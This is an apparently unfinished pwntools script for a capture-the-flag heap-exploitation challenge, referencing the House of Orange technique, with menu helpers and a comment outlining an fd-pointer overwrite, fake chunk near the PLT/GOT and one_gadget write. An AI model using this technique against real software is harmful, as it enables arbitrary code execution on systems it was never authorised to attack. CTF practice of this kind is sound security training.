'''
OG House of Orange Challenge. 
- http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '' # For alternate version of libc
env = {}

# Binary setup
elf_name = 'challenge'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p)
else: 
	p = remote(domain, port) 

# Send the name of the chef
def introduction(name):
	p.sendlineafter("name", name)

# Add a sandwich
def add(butter, jelly): 
	p.sendlineafter(">", "1") 
	p.sendlineafter("Type: ", butter) # Input for butter
	p.sendlineafter("Type: ", jelly)  # Input for jelly
	return 

# Remove the sandwich 
def remove(index):
	p.sendlineafter(">", "2") 
	p.sendlineafter("remove:", str(index))
	return 

def print_wich(index): 
	pass 

def hidden(): 
	p.sendlineafter(">", "1337") 
	return 

''' 
Plan: 

- Overwrite fd pointer to point to name value, with a fake chunk, next to PLT/GOT.
- Once this chunk is freed, allocate it back
- Write a one_gadget to the PLT/GOT entry.
'''

introduction("AAAA") 
add("BBBB", "CCCC") 
add("CCCC", "DDDD") 
add("EEEE", "FFFF") 
p.interactive()


